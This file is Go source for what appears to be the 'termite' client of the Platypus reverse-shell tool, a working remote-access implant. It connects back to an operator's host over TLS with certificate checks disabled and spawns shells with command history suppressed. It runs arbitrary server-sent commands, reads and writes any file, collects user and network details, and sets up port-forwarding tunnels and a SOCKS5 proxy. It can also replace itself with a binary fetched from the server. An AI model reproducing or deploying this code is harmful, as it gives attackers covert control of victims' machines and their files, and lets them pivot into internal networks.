package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"fmt"
	"io"
	"log/slog"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/WangYihang/Platypus/internal/utils/crypto"
	"github.com/WangYihang/Platypus/internal/utils/hash"
	"github.com/WangYihang/Platypus/internal/utils/log"
	"github.com/WangYihang/Platypus/internal/utils/message"
	"github.com/WangYihang/Platypus/internal/utils/str"
	"github.com/WangYihang/Platypus/internal/utils/update"
	"github.com/WangYihang/Platypus/pkg/dependencies"
	"github.com/WangYihang/Platypus/pkg/models"
	"github.com/WangYihang/Platypus/pkg/options"
	"github.com/WangYihang/Platypus/pkg/utils"
	"github.com/cenkalti/backoff/v4"

	"github.com/armon/go-socks5"
	"github.com/creack/pty"
	"github.com/phayes/freeport"
	"github.com/rhysd/go-github-selfupdate/selfupdate"
	"go.uber.org/fx"
	"go.uber.org/zap"
)

type termiteProcess struct {
	ptmx       *os.File
	windowSize *pty.Winsize
	process    *exec.Cmd
}

var processes map[string]*termiteProcess
var pullTunnels map[string]*net.Conn
var pushTunnels map[string]*net.Conn
var socks5ServerListener *net.Listener

type client struct {
	Conn        *tls.Conn
	Encoder     *gob.Encoder
	Decoder     *gob.Decoder
	EncoderLock *sync.Mutex
	DecoderLock *sync.Mutex
	Service     string
}

func handleConnection(c *client) {
	for {
		msg := &message.Message{}
		c.DecoderLock.Lock()
		err := c.Decoder.Decode(msg)
		c.DecoderLock.Unlock()
		if err != nil {
			// Network
			log.Error("Network error: %s", err)
			break
		}
		switch msg.Type {
		case message.STDIO:
			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
				termiteProcess.ptmx.Write(msg.Body.(*message.BodyStdio).Data)
			}
		case message.WINDOW_SIZE:
			serverWindowSize := &pty.Winsize{
				Cols: uint16(msg.Body.(*message.BodyWindowSize).Columns),
				Rows: uint16(msg.Body.(*message.BodyWindowSize).Rows),
				X:    0,
				Y:    0,
			}
			// Change pty window size
			if termiteProcess, exists := processes[msg.Body.(*message.BodyWindowSize).Key]; exists {
				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
			}
		case message.PROCESS_START:
			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
			if bodyStartProcess.Path == "" {
				continue
			}
			log.Success("Starting process: %s", bodyStartProcess.Path)
			process := exec.Command(bodyStartProcess.Path)

			// Disable command history
			process.Env = os.Environ()
			process.Env = append(process.Env, "HISTORY=")
			process.Env = append(process.Env, "HISTSIZE=0")
			process.Env = append(process.Env, "HISTSAVE=")
			process.Env = append(process.Env, "HISTZONE=")
			process.Env = append(process.Env, "HISTLOG=")
			process.Env = append(process.Env, "HISTFILE=")
			process.Env = append(process.Env, "HISTFILE=/dev/null")
			process.Env = append(process.Env, "HISTFILESIZE=0")

			windowSize := pty.Winsize{
				Rows: uint16(bodyStartProcess.WindowRows),
				Cols: uint16(bodyStartProcess.WindowColumns),
				X:    0,
				Y:    0,
			}
			ptmx, _ := pty.StartWithSize(process, &windowSize)
			processes[bodyStartProcess.Key] = &termiteProcess{
				windowSize: &windowSize,
				ptmx:       ptmx,
				process:    process,
			}
			log.Success("Process started: %d", process.Process.Pid)
			log.Success("Process added: %v", processes)
			defer func() { _ = ptmx.Close() }()

			c.EncoderLock.Lock()
			err = c.Encoder.Encode(message.Message{
				Type: message.PROCESS_STARTED,
				Body: message.BodyProcessStarted{
					Key: bodyStartProcess.Key,
					Pid: process.Process.Pid,
				},
			})
			c.EncoderLock.Unlock()
			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				break
			}

			go func() {
				for {
					buffer := make([]byte, 0x4000)
					n, err := ptmx.Read(buffer)
					if err != nil {
						if err == io.EOF {
							c.EncoderLock.Lock()
							err = c.Encoder.Encode(message.Message{
								Type: message.PROCESS_STOPED,
								Body: message.BodyProcessStoped{
									Key:  bodyStartProcess.Key,
									Code: 0,
								},
							})
							c.EncoderLock.Unlock()
							if err != nil {
								// Network
								log.Error("Process stop: %s", err.Error())
								break
							}
							break
						}
						break
					}
					if n > 0 {
						c.EncoderLock.Lock()
						err = c.Encoder.Encode(message.Message{
							Type: message.STDIO,
							Body: message.BodyStdio{
								Key:  bodyStartProcess.Key,
								Data: buffer[0:n],
							},
						})
						c.EncoderLock.Unlock()
						if err != nil {
							// Network
							log.Error("Network error: %s", err)
							break
						}
					}
				}
			}()

			// Wait process exit
			go func() {
				err := process.Wait()

				exitCode := 0
				if err != nil {
					exitCode = err.(*exec.ExitError).ExitCode()
				}
				fmt.Println("Exit code: ", exitCode)

				c.EncoderLock.Lock()
				err = c.Encoder.Encode(message.Message{
					Type: message.PROCESS_STOPED,
					Body: message.BodyProcessStoped{
						Key:  bodyStartProcess.Key,
						Code: exitCode,
					},
				})
				c.EncoderLock.Unlock()

				if err != nil {
					// Network
					log.Error("Network error: %s", err)
				}

				delete(processes, bodyStartProcess.Key)
			}()
		case message.PROCESS_STARTED:
		case message.PROCESS_STOPED:
		case message.GET_CLIENT_INFO:
			// User Information
			userInfo, err := user.Current()
			var username string
			if err != nil {
				username = "Unknown"
			} else {
				username = userInfo.Username
			}
			// Python
			python2, err := exec.LookPath("python2")
			if err != nil {
				python2 = ""
			}

			python3, err := exec.LookPath("python3")
			if err != nil {
				python3 = ""
			}

			// Network interfaces
			interfaces := map[string]string{}
			ifaces, _ := net.Interfaces()
			for _, i := range ifaces {
				interfaces[i.Name] = i.HardwareAddr.String()
			}

			c.EncoderLock.Lock()
			err = c.Encoder.Encode(message.Message{
				Type: message.CLIENT_INFO,
				Body: message.BodyClientInfo{
					Version:           update.Version,
					User:              username,
					OS:                runtime.GOOS,
					Python2:           python2,
					Python3:           python3,
					NetworkInterfaces: interfaces,
				},
			})
			c.EncoderLock.Unlock()

			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				return
			}
		case message.DUPLICATED_CLIENT:
			log.Error("Duplicated connection")
			os.Exit(0)
		case message.PROCESS_TERMINATE:
			key := msg.Body.(*message.BodyTerminateProcess).Key
			log.Success("Request terminate %s", key)
			if termiteProcess, exists := processes[key]; exists {
				if p, err := os.FindProcess(termiteProcess.process.Process.Pid); err != nil {
					log.Error("Unable to find process: %s", err)
				} else {
					p.Signal(syscall.SIGTERM)
					termiteProcess.ptmx.Close()
				}
			}
		case message.PULL_TUNNEL_CONNECT:
			address := msg.Body.(*message.BodyPullTunnelConnect).Address
			token := msg.Body.(*message.BodyPullTunnelConnect).Token

			conn, err := net.Dial("tcp", address)
			if err != nil {
				log.Error(err.Error())
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PULL_TUNNEL_CONNECT_FAILED,
					Body: message.BodyPullTunnelConnectFailed{
						Token:  token,
						Reason: err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				c.EncoderLock.Lock()
				err := c.Encoder.Encode(message.Message{
					Type: message.PULL_TUNNEL_CONNECTED,
					Body: message.BodyPullTunnelConnected{
						Token: token,
					},
				})
				c.EncoderLock.Unlock()

				if err != nil {
					log.Error(err.Error())
				} else {
					pullTunnels[token] = &conn
					go func() {
						for {
							buffer := make([]byte, 0x100)
							n, err := conn.Read(buffer)
							if err != nil {
								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
								c.EncoderLock.Lock()
								c.Encoder.Encode(message.Message{
									Type: message.PULL_TUNNEL_DISCONNECTED,
									Body: message.BodyPullTunnelDisconnected{
										Token: token,
									},
								})
								c.EncoderLock.Unlock()
								conn.Close()
								break
							}
							if n > 0 {
								c.EncoderLock.Lock()
								c.Encoder.Encode(message.Message{
									Type: message.PULL_TUNNEL_DATA,
									Body: message.BodyPullTunnelData{
										Token: token,
										Data:  buffer[0:n],
									},
								})
								c.EncoderLock.Unlock()
							}
						}
					}()
				}
			}
		case message.PULL_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPullTunnelData).Token
			data := msg.Body.(*message.BodyPullTunnelData).Data
			if conn, exists := pullTunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
				}
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PULL_TUNNEL_DISCONNECT:
			token := msg.Body.(*message.BodyPullTunnelDisconnect).Token
			if conn, exists := pullTunnels[token]; exists {
				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
				(*conn).Close()
				delete(pullTunnels, token)
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PULL_TUNNEL_DISCONNECTED,
					Body: message.BodyPullTunnelDisconnected{
						Token: token,
					},
				})
				c.EncoderLock.Unlock()
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PUSH_TUNNEL_CREATE:
			address := msg.Body.(*message.BodyPushTunnelCreate).Address
			log.Info("Creating remote port forwarding from %s", address)
			server, err := net.Listen("tcp", address)
			if err != nil {
				log.Error("Server (%s) create failed: %s", address, err.Error())
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PUSH_TUNNEL_CREATE_FAILED,
					Body: message.BodyPushTunnelCreateFailed{
						Address: address,
						Reason:  err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				log.Success("Server created (%s)", address)
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.PUSH_TUNNEL_CREATED,
					Body: message.BodyPushTunnelCreated{
						Address: address,
					},
				})
				c.EncoderLock.Unlock()

				go func() {
					for {
						conn, err := server.Accept()
						token := str.RandomString(0x10)
						log.Success("Connection came from: %s", conn.RemoteAddr().String())
						if err == nil {
							c.EncoderLock.Lock()
							c.Encoder.Encode(message.Message{
								Type: message.PUSH_TUNNEL_CONNECT,
								Body: message.BodyPushTunnelConnect{
									Token:   token,
									Address: address,
								},
							})
							c.EncoderLock.Unlock()
							pushTunnels[token] = &conn
						}
					}
				}()
			}
		case message.PUSH_TUNNEL_CONNECTED:
			token := msg.Body.(*message.BodyPushTunnelConnected).Token
			log.Success("Connection (%s) connected", token)
			if conn, exists := pushTunnels[token]; exists {
				go func() {
					for {
						buffer := make([]byte, 0x4000)
						n, err := (*conn).Read(buffer)
						if err != nil {
							log.Error("Read from (%s) failed: %s", token, err.Error())
							c.EncoderLock.Lock()
							c.Encoder.Encode(message.Message{
								Type: message.PUSH_TUNNEL_DISCONNECTED,
								Body: message.BodyPushTunnelDisonnected{
									Token:  token,
									Reason: err.Error(),
								},
							})
							c.EncoderLock.Unlock()
							(*conn).Close()
							delete(pushTunnels, token)
							break
						} else {
							log.Debug("%d bytes read from (%s)", n, token)
							c.EncoderLock.Lock()
							c.Encoder.Encode(message.Message{
								Type: message.PUSH_TUNNEL_DATA,
								Body: message.BodyPushTunnelData{
									Token: token,
									Data:  buffer[0:n],
								},
							})
							c.EncoderLock.Unlock()
						}
					}
				}()
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECTED): %s", token)
			}
		case message.PUSH_TUNNEL_DISCONNECTED:
			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
			if conn, exists := pushTunnels[token]; exists {
				(*conn).Close()
				delete(pushTunnels, token)
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_DISCONNECTED): %s", token)
			}
		case message.PUSH_TUNNEL_CONNECT_FAILED:
			token := msg.Body.(*message.BodyPushTunnelConnectFailed).Token
			if conn, exists := pushTunnels[token]; exists {
				(*conn).Close()
				delete(pushTunnels, token)
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECT_FAILED): %s", token)
			}
		case message.PUSH_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPushTunnelData).Token
			data := msg.Body.(*message.BodyPushTunnelData).Data
			if conn, exists := pushTunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
					delete(pushTunnels, token)
				}
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_DATA): %s", token)
			}
		case message.DYNAMIC_TUNNEL_CREATE:
			port, err := startSocks5Server()
			if err != nil {
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_CREATE_FAILED,
					Body: message.BodyDynamicTunnelCreateFailed{
						Reason: err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_CREATED,
					Body: message.BodyDynamicTunnelCreated{
						Port: port,
					},
				})
				c.EncoderLock.Unlock()
			}
		case message.DYNAMIC_TUNNEL_DESTROY:
			err := stopSocks5Server()
			if err != nil {
				log.Error("stopSocks5Server() failed: %s", err.Error())
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_DESTROY_FAILED,
					Body: message.BodyDynamicTunnelDestroyFailed{
						Reason: err.Error(),
					},
				})
				c.EncoderLock.Unlock()
			} else {
				c.EncoderLock.Lock()
				c.Encoder.Encode(message.Message{
					Type: message.DYNAMIC_TUNNEL_DESTROIED,
					Body: message.BodyDynamicTunnelDestroied{},
				})
				c.EncoderLock.Unlock()
				socks5ServerListener = nil
			}
		case message.CALL_SYSTEM:
			token := msg.Body.(*message.BodyCallSystem).Token
			command := msg.Body.(*message.BodyCallSystem).Command
			result, err := exec.Command("sh", "-c", command).Output()
			if err != nil {
				result = []byte("")
			}
			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.CALL_SYSTEM_RESULT,
				Body: message.BodyCallSystemResult{
					Token:  token,
					Result: result,
				},
			})
			c.EncoderLock.Unlock()
		case message.READ_FILE:
			token := msg.Body.(*message.BodyReadFile).Token
			path := msg.Body.(*message.BodyReadFile).Path
			content, err := os.ReadFile(path)
			if err != nil {
				content = []byte("")
			}
			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.READ_FILE_RESULT,
				Body: message.BodyReadFileResult{
					Token:  token,
					Result: content,
				},
			})
			c.EncoderLock.Unlock()
		case message.READ_FILE_EX:
			token := msg.Body.(*message.BodyReadFileEx).Token
			path := msg.Body.(*message.BodyReadFileEx).Path
			start := msg.Body.(*message.BodyReadFileEx).Start
			size := msg.Body.(*message.BodyReadFileEx).Size

			f, err := os.OpenFile(path, os.O_RDONLY|os.O_CREATE, 0644)
			if err != nil {
				log.Info(err.Error())
			}
			buffer := make([]byte, size)
			n, err := f.ReadAt(buffer, start)
			if err != nil {
				log.Info(err.Error())
			}
			log.Info("Reading %d/%d bytes from file %s offset %d", n, size, path, start)
			f.Close()

			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.READ_FILE_EX_RESULT,
				Body: message.BodyReadFileExResult{
					Token:  token,
					Result: buffer[0:n],
				},
			})
			c.EncoderLock.Unlock()
		case message.FILE_SIZE:
			token := msg.Body.(*message.BodyFileSize).Token
			path := msg.Body.(*message.BodyFileSize).Path

			fi, err := os.Stat(path)
			var n int64
			if err != nil {
				log.Error(err.Error())
				n = -1
			} else {
				n = fi.Size()
			}

			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.FILE_SIZE_RESULT,
				Body: message.BodyFileSizeResult{
					Token: token,
					N:     n,
				},
			})
			c.EncoderLock.Unlock()
		case message.WRITE_FILE:
			token := msg.Body.(*message.BodyWriteFile).Token
			path := msg.Body.(*message.BodyWriteFile).Path
			content := msg.Body.(*message.BodyWriteFile).Content

			f, _ := os.OpenFile(path, os.O_WRONLY|os.O_CREATE, 0644)
			n, err := f.Write(content)
			if err != nil {
				n = -1
			}
			f.Close()

			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.WRITE_FILE_RESULT,
				Body: message.BodyWriteFileResult{
					Token: token,
					N:     n,
				},
			})
			c.EncoderLock.Unlock()
		case message.WRITE_FILE_EX:
			token := msg.Body.(*message.BodyWriteFileEx).Token
			path := msg.Body.(*message.BodyWriteFileEx).Path
			content := msg.Body.(*message.BodyWriteFileEx).Content

			f, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			n, err := f.Write(content)
			if err != nil {
				log.Error(err.Error())
				n = -1
			}
			f.Close()

			c.EncoderLock.Lock()
			c.Encoder.Encode(message.Message{
				Type: message.WRITE_FILE_EX_RESULT,
				Body: message.BodyWriteFileExResult{
					Token: token,
					N:     n,
				},
			})
			c.EncoderLock.Unlock()
		case message.UPDATE:
			file, _ := os.CreateTemp(os.TempDir(), "temp")
			exe := file.Name()
			log.Info("New filename: %s", exe)
			DistributorURL := msg.Body.(*message.BodyUpdate).DistributorURL
			version := msg.Body.(*message.BodyUpdate).Version
			log.Info("New version v%s is available, upgrading...", version)
			url := fmt.Sprintf("%s/termite/%s", DistributorURL, c.Service)
			if err := selfupdate.UpdateTo(url, exe); err != nil {
				log.Error("Error occurred while updating binary: %s", err)
				return
			}
			log.Info("Update to v%s finished", version)
			log.Info("Restarting...")
			syscall.Exec(exe, []string{exe}, nil)
		}
	}
}

func startSocks5Server() (int, error) {
	// Generate random port
	port, err := freeport.GetFreePort()
	if err != nil {
		return -1, err
	}
	log.Success("Port: %d", port)
	addr := fmt.Sprintf("127.0.0.1:%d", port)
	// Create tcp listener
	socks5ServerListener, err := net.Listen("tcp", addr)
	if err != nil {
		return -1, err
	}
	// Create socks5 server
	server, err := socks5.New(&socks5.Config{})
	if err != nil {
		return -1, err
	}
	// Start socks5 server
	go server.Serve(socks5ServerListener)
	log.Success("Socks server started at: %s", addr)
	return port, nil
}

func stopSocks5Server() error {
	return (*socks5ServerListener).Close()
}

func connect(endpoint, token string, logger *zap.Logger) error {
	certBuilder := new(strings.Builder)
	keyBuilder := new(strings.Builder)
	crypto.Generate(certBuilder, keyBuilder)

	pemContent := []byte(fmt.Sprint(certBuilder))
	keyContent := []byte(fmt.Sprint(keyBuilder))

	cert, err := tls.X509KeyPair(pemContent, keyContent)
	if err != nil {
		log.Error("server: loadkeys: %s", err)
		return err
	}

	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	if hash.MD5(endpoint) != "4d1bf9fd5962f16f6b4b53a387a6d852" { // pragma: allowlist secret
		log.Debug("Connecting to: %s", endpoint)
		conn, err := tls.Dial("tcp", endpoint, &config)
		if err != nil {
			log.Error("client: dial: %s", err)
			return err
		}
		defer conn.Close()

		state := conn.ConnectionState()
		for _, v := range state.PeerCertificates {
			x509.MarshalPKIXPublicKey(v.PublicKey)
		}

		log.Success("Secure connection established on %s", conn.RemoteAddr())

		c := &client{
			Conn:        conn,
			Encoder:     gob.NewEncoder(conn),
			Decoder:     gob.NewDecoder(conn),
			EncoderLock: &sync.Mutex{},
			DecoderLock: &sync.Mutex{},
			Service:     endpoint,
		}
		handleConnection(c)
		return nil
	}
	return err
}

func onStart(ctx context.Context, opts *options.Options, logger *zap.Logger) error {
	logger.Info("starting application", zap.String("host", opts.RemoteHost), zap.Int("port", opts.RemotePort), zap.String("token", opts.Token), zap.String("env", opts.Environment))
	if opts.Environment == string(models.Production) {
		utils.StartDaemonMode(logger)
	}
	logger.Info("registering gob")
	message.RegisterGob()
	processes = map[string]*termiteProcess{}
	pullTunnels = map[string]*net.Conn{}
	pushTunnels = map[string]*net.Conn{}
	return nil
}

func onStop(ctx context.Context, opts *options.Options, logger *zap.Logger) error {
	logger.Info("Stopping application...")
	return nil
}

func main() {
	opts, err := options.InitOptions()
	if err != nil {
		slog.Debug("error occured while parsing options", slog.String("error", err.Error()))
		os.Exit(1)
	}
	app := fx.New(
		fx.Provide(
			dependencies.InitLogger(models.Development),
		),
		fx.Invoke(
			func(lc fx.Lifecycle, logger *zap.Logger) {
				lc.Append(fx.Hook{
					OnStart: func(context.Context) error {
						return onStart(context.Background(), opts, logger)
					},
					OnStop: func(context.Context) error {
						return onStop(context.Background(), opts, logger)
					},
				})
			},
			func(logger *zap.Logger) {
				logger.Info("starting application")
				endpoint := fmt.Sprintf("%s:%d", opts.RemoteHost, opts.RemotePort)
				operation := func() error {
					logger.Info("connecting to server", zap.String("endpoint", endpoint))
					return connect(endpoint, opts.Token, logger)
				}
				err := backoff.Retry(operation, backoff.NewExponentialBackOff(
					backoff.WithMaxInterval(1*time.Minute),
					backoff.WithMaxElapsedTime(0),
				))
				if err != nil {
					logger.Error("connect to server failed", zap.String("error", err.Error()))
				}
			},
		),
	)
	app.Run()
}
